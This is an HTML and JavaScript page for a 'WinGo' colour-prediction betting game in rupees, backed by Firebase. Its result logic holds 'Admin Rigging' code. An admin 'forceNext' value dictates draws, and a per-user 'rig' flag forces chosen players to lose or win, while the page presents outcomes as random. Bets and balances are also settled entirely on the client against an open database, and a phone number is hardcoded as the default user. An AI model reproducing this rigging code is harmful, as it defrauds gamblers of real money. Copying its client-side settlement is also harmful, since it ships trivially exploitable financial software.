<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>WinGo VIP - Fixed Edition</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p-red: #ff4d4d; --p-green: #4cd964; --p-violet: #b666d2; --theme-grad: linear-gradient(135deg, #ff4d4d, #f12711); }
        body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; user-select: none; overflow-x: hidden; }
        
        #resultPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); background: white; padding: 30px; border-radius: 25px; z-index: 10000; text-align: center; box-shadow: 0 0 50px rgba(0,0,0,0.5); transition: 0.4s; width: 80%; max-width: 320px; }
        #resultPopup.show { transform: translate(-50%, -50%) scale(1); }
        .overlay-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 9999; }
        
        #lockOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9998; display: none; align-items: center; justify-content: center; flex-direction: column; color: white; }
        
        .header { background: var(--theme-grad); padding: 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
        .wallet-box { background: rgba(255,255,255,0.15); padding: 15px; border-radius: 15px; margin-top: 15px; border: 1px solid rgba(255,255,255,0.2); }
        
        .mode-container { display: flex; background: white; margin: 10px; border-radius: 12px; overflow: hidden; }
        .mode-tab { flex: 1; padding: 15px; text-align: center; font-weight: bold; cursor: pointer; color: #999; }
        .mode-tab.active { color: var(--p-red); border-bottom: 3px solid var(--p-red); background: #fff5f5; }
        
        .timer-card { background: white; margin: 15px; padding: 20px; border-radius: 20px; display: flex; justify-content: space-between; align-items: center; }
        
        .c-btn { flex: 1; padding: 12px; border-radius: 8px; color: white; font-weight: bold; border: none; cursor: pointer; }
        
        .btn-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin: 15px; }
        .n-btn { height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; cursor: pointer; border: 2px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }

        table { width: 100%; text-align: center; border-collapse: collapse; font-size: 12px; }
        th { padding: 12px; background: #f8f9fa; color: #666; }
        td { padding: 12px; border-bottom: 1px solid #eee; }

        #bettingPanel { position: fixed; bottom: -100%; left: 0; width: 100%; background: white; z-index: 2000; border-radius: 25px 25px 0 0; transition: 0.4s; padding: 25px; box-sizing: border-box; }
        #bettingPanel.show { bottom: 0; }
        .dot { height: 12px; width: 12px; border-radius: 50%; display: inline-block; margin-right: 5px; vertical-align: middle; }
    </style>
</head>
<body>

    <div class="overlay-bg" id="overlay" onclick="closePopup()"></div>
    <div id="resultPopup">
        <div id="resEmoji" style="font-size: 50px; margin-bottom: 10px;">ðŸŽ‰</div>
        <h2 id="resTitle">--</h2>
        <h1 id="resAmount" style="color: var(--p-red);">â‚¹0.00</h1>
        <button onclick="closePopup()" style="width:100%; padding:12px; border-radius:12px; border:none; background:var(--theme-grad); color:white; font-weight:bold; margin-top:15px;">CLOSE</button>
    </div>

    <div id="lockOverlay">
        <h2>Calculating Result...</h2>
        <h1 id="lockTimer" style="font-size:80px; color: var(--p-red);">0</h1>
    </div>

    <div class="header">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <i class="fas fa-chevron-left" onclick="window.history.back()"></i>
            <span style="font-weight:bold; font-size:18px;">WinGo Master</span>
            <i class="fas fa-headset"></i>
        </div>
        <div class="wallet-box">
            <small>Available Balance</small>
            <div style="font-size:26px; font-weight:bold;">â‚¹<span id="uBalance">0.00</span></div>
        </div>
    </div>

    <div class="mode-container">
        <div id="m1" class="mode-tab active" onclick="switchMode(1)">1Min</div>
        <div id="m3" class="mode-tab" onclick="switchMode(3)">3Min</div>
        <div id="m5" class="mode-tab" onclick="switchMode(5)">5Min</div>
    </div>

    <div class="timer-card">
        <div><small>Period</small><br><b id="periodId" style="font-size: 14px;">...</b></div>
        <div style="text-align:right;"><small>Time Left</small><br><div id="mainTimer" style="font-size:24px; font-weight:bold; color:var(--p-red);">00:00</div></div>
    </div>

    <div style="display:flex; gap:10px; margin:15px;">
        <button onclick="openBet('Green')" class="c-btn" style="background:var(--p-green)">Green</button>
        <button onclick="openBet('Violet')" class="c-btn" style="background:var(--p-violet)">Violet</button>
        <button onclick="openBet('Red')" class="c-btn" style="background:var(--p-red)">Red</button>
    </div>
    <div class="btn-grid" id="numberGrid"></div>

    <div style="background:white; margin:15px; border-radius:20px; overflow:hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.05);">
        <div style="display:flex; border-bottom:1px solid #eee;">
            <div id="ghTab" class="mode-tab active" style="padding:10px;" onclick="toggleH('game')">Game History</div>
            <div id="mhTab" class="mode-tab" style="padding:10px;" onclick="toggleH('my')">My Bets</div>
        </div>
        <div id="gameBox"><table><thead><tr><th>Period</th><th>Num</th><th>Size</th><th>Color</th></tr></thead><tbody id="gameHistory"></tbody></table></div>
        <div id="myBox" style="display:none;"><table><thead><tr><th>Period</th><th>Bet</th><th>Amt</th><th>Status</th></tr></thead><tbody id="myBets"></tbody></table></div>
    </div>

    <div id="bettingPanel">
        <h3 id="targetLabel" style="text-align:center;">Bet Amount</h3>
        <div style="display:flex; justify-content:center; align-items:center; gap:20px; margin:25px 0;">
            <button onclick="adjustAmt(-10)" style="width:45px; height:45px; border-radius:50%; border:1px solid #ddd;">-</button>
            <input type="number" id="betAmtInput" value="10" style="width:100px; text-align:center; font-size:24px; border:none; font-weight:bold;">
            <button onclick="adjustAmt(10)" style="width:45px; height:45px; border-radius:50%; border:1px solid #ddd;">+</button>
        </div>
        <button id="confirmBtn" onclick="confirmBet()" style="width:100%; padding:18px; border-radius:15px; border:none; background:var(--theme-grad); color:white; font-weight:bold;">CONFIRM â‚¹<span id="totalPrice">10</span></button>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, set, onValue, push, update, increment, get, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const fbConfig = { databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com" };
    const app = initializeApp(fbConfig);
    const db = getDatabase(app);
    const userPhone = localStorage.getItem('userPhone') || '9117748052';

    let currentMode = 1, currentPeriod = "", selectedBet = "";

    // Numbers UI
    const grid = document.getElementById('numberGrid');
    for(let i=0; i<=9; i++) {
        let bg = i===0 ? 'linear-gradient(135deg, var(--p-violet) 50%, var(--p-red) 50%)' : (i===5 ? 'linear-gradient(135deg, var(--p-violet) 50%, var(--p-green) 50%)' : (i%2===0 ? 'var(--p-red)' : 'var(--p-green)'));
        grid.innerHTML += `<div onclick="openBet(${i})" class="n-btn" style="background:${bg}">${i}</div>`;
    }

    // Result Processing
    async function processCycle(oldP) {
        const historyRef = ref(db, `wingoHistory/${currentMode}/${oldP}`);
        const forceSnap = await get(ref(db, `adminControl/wingo/${currentMode}/forceNext`));
        let forced = forceSnap.exists() ? forceSnap.val() : "none";
        
        let num = (forced === "none") ? Math.floor(Math.random()*10) : (isNaN(forced) ? (forced==='Red'?2:1) : parseInt(forced));
        const res = { period: oldP, number: num, color: (num===0||num===5)?'Violet':(num%2===0?'Red':'Green'), size: num>=5?'Big':'Small' };
        
        await set(historyRef, res);
        if(forced !== "none") await set(ref(db, `adminControl/wingo/${currentMode}/forceNext`), "none");

        // Winnings Logic
        const poolSnap = await get(ref(db, `activeBetsPool/${currentMode}/${oldP}`));
        if(poolSnap.exists()) {
            const users = poolSnap.val();
            for(let ph in users) {
                let winTotal = 0;
                for(let bid in users[ph]) {
                    const b = users[ph][bid];
                    let isWin = (b.type == res.number || b.type == res.color || b.type == res.size);
                    
                    // Admin Rigging
                    const uSnap = await get(ref(db, `users/${ph}`));
                    if(uSnap.val().rig === 'loss') isWin = false;
                    if(uSnap.val().rig === 'win') isWin = true;

                    let mult = (typeof b.type === 'number') ? 9 : 2;
                    let winAmt = isWin ? (b.amount * mult) : 0;
                    winTotal += winAmt;

                    await update(ref(db, `userBets/${ph}/${bid}`), { status: isWin ? 'win' : 'loss', winAmount: winAmt });
                }
                if(winTotal > 0) await update(ref(db, `users/${ph}`), { balance: increment(winTotal) });
                if(ph === userPhone) showPopup(winTotal);
            }
            await set(ref(db, `activeBetsPool/${currentMode}/${oldP}`), null);
        }
    }

    // Timer
    setInterval(() => {
        const now = new Date();
        const left = (currentMode * 60) - ((now.getMinutes() % currentMode) * 60 + now.getSeconds());
        document.getElementById('mainTimer').innerText = `00:${left.toString().padStart(2,'0')}`;
        
        if(left <= 5) document.getElementById('lockOverlay').style.display = 'flex', document.getElementById('lockTimer').innerText = left;
        else document.getElementById('lockOverlay').style.display = 'none';

        if(left === 0) {
            let op = currentPeriod; updatePeriod();
            setTimeout(() => processCycle(op), 1000);
        }
    }, 1000);

    // Sync Data
    function sync() {
        onValue(ref(db, `users/${userPhone}/balance`), s => document.getElementById('uBalance').innerText = (s.val()||0).toFixed(2));
        
        // Game History
        onValue(query(ref(db, `wingoHistory/${currentMode}`), limitToLast(12)), snap => {
            const h = document.getElementById('gameHistory'); h.innerHTML = "";
            snap.forEach(c => {
                const d = c.val(); let clr = d.color==='Green'?'var(--p-green)':(d.color==='Red'?'var(--p-red)':'var(--p-violet)');
                h.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td style="color:${clr}; font-weight:bold">${d.number}</td><td>${d.size}</td><td><span class="dot" style="background:${clr}"></span>${d.color}</td></tr>`);
            });
        });

        // My Bets History Fix
        onValue(query(ref(db, `userBets/${userPhone}`), limitToLast(15)), snap => {
            const m = document.getElementById('myBets'); m.innerHTML = "";
            snap.forEach(c => {
                const d = c.val(); 
                if(d.mode == currentMode) {
                    let sColor = d.status === 'win' ? 'var(--p-green)' : (d.status === 'loss' ? 'var(--p-red)' : '#999');
                    let statusText = d.status === 'win' ? `WIN (+â‚¹${d.winAmount})` : (d.status === 'loss' ? 'LOSS' : 'PENDING');
                    m.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td>${d.type}</td><td>â‚¹${d.amount}</td><td style="color:${sColor}; font-weight:bold">${statusText}</td></tr>`);
                }
            });
        });
    }

    window.updatePeriod = () => {
        const now = new Date();
        const dateStr = now.getFullYear() + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0');
        const pIdx = Math.floor((now.getHours()*60 + now.getMinutes()) / currentMode) + 1;
        currentPeriod = dateStr + pIdx.toString().padStart(4,'0');
        document.getElementById('periodId').innerText = currentPeriod;
    };

    window.confirmBet = async () => {
        const amt = parseInt(document.getElementById('betAmtInput').value);
        const bSnap = await get(ref(db, `users/${userPhone}/balance`));
        if(bSnap.val() < amt) return alert("Insufficient Balance!");

        const bid = push(ref(db, `userBets/${userPhone}`)).key;
        await update(ref(db, `users/${userPhone}`), { balance: increment(-amt) });
        await set(ref(db, `userBets/${userPhone}/${bid}`), { period: currentPeriod, type: selectedBet, amount: amt, status: 'pending', mode: currentMode });
        await set(ref(db, `activeBetsPool/${currentMode}/${currentPeriod}/${userPhone}/${bid}`), { amount: amt, type: selectedBet });
        closeBet();
    };

    window.switchMode = (m) => { currentMode = m; updatePeriod(); sync(); document.querySelectorAll('.mode-tab').forEach(t=>t.classList.remove('active')); document.getElementById('m'+m).classList.add('active'); };
    window.openBet = (t) => { selectedBet = t; document.getElementById('targetLabel').innerText = "Bet: "+t; document.getElementById('bettingPanel').classList.add('show'); };
    window.closeBet = () => document.getElementById('bettingPanel').classList.remove('show');
    window.showPopup = (amt) => {
        document.getElementById('resEmoji').innerText = amt > 0 ? "ðŸŽ‰" : "ðŸ“‰";
        document.getElementById('resTitle').innerText = amt > 0 ? "You Won!" : "Better Luck Next Time";
        document.getElementById('resAmount').innerText = "â‚¹" + amt.toFixed(2);
        document.getElementById('overlay').style.display = 'block';
        document.getElementById('resultPopup').classList.add('show');
    };
    window.closePopup = () => { document.getElementById('overlay').style.display = 'none'; document.getElementById('resultPopup').classList.remove('show'); };
    window.adjustAmt = (v) => { let i = document.getElementById('betAmtInput'); i.value = Math.max(10, parseInt(i.value)+v); document.getElementById('totalPrice').innerText = i.value; };
    window.toggleH = (t) => {
        document.getElementById('gameBox').style.display = t==='game'?'block':'none';
        document.getElementById('myBox').style.display = t==='my'?'block':'none';
        document.getElementById('ghTab').classList.toggle('active', t==='game');
        document.getElementById('mhTab').classList.toggle('active', t==='my');
    };

    updatePeriod(); sync();
</script>
</body>
</html>
